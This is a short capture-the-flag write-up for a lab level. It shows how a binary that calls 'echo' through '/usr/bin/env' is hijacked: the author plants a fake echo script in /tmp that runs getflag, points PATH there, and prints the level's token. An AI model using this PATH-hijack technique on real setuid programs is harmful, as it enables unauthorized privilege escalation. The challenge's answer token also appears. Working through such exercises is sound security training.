When we started the level03, in the home of the user we found the binary **level03**

it prints:
```bash
Exploit me
```

Let's disasemble it:
first let's check the strings in the binary with:
```bash
strings level03
```

we can see this line:
```
/usr/bin/env echo Exploit me
```

It seems like the binary use the environement to find the path for echo, then it prints *Exploit me*

We can confirm it with gdb:

```bash
gdb ./level03
```

```gdb
(gdb) info functions
All defined functions:

File /home/user/level03/level03.c:
int main(int, char **, char **);
```

The main use int (argc), char**(argv), char**(envp).
So if we **delete the PATH variable in env**, the binary can't find echo.

So... we can redefine a path to a custom echo !
lets create it:

```bash
cd tmp
vim echo
```

```bash
#!/bin/bash
/bin/getflag
```

```bash
chmod +x echo
```

then we redefine the PATH:

```bash
export PATH="/tmp"
```

and the binary give us:
```bash
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

```